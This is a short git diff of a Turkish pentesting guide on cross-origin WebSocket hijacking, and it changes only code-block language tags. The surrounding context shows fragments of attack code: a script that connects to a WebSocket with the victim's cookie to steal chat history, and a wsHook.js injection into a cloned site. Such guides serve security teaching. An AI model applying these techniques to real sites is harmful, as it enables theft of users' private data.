@@ -101,7 +101,7 @@ Ayrıca "**cross-origin WebSocket hijacking**" veya "**cross-origin WebSocket hi
 
 Unutmayın ki bir WebSocket bağlantısı kurulduğunda cookie sunucuya gönderilir. Sunucu, örneğin bir mesajla "READY" ifadesi gönderildiğinde kullanıcıya ait bir konuşma geçmişini geri gönderiyorsa, basit bir XSS bağlantısı kurarak (cookie otomatik olarak gönderilecektir) "READY" mesajını göndererek konuşma geçmişini çalabilirsiniz:
 
-```javascript
+```html
 <script>
 websocket = new WebSocket('wss://websoket-urlsi')
 websocket.onopen = start
@@ -121,7 +121,7 @@ function handleReply(event) {
 
 Hedeflenen web uygulamasını taklit etmek için (.html dosyaları gibi) siteyi kopyalayın ve WebSocket iletişiminin gerçekleştiği script içine aşağıdaki kodu ekleyin:
 
-```javascript
+```html
 <script src='wsHook.js'></script>
 
 //Bu, bir mesaj gönderilmeden önce veya sunucudan alındıktan sonra çalışacak işlevlerdir
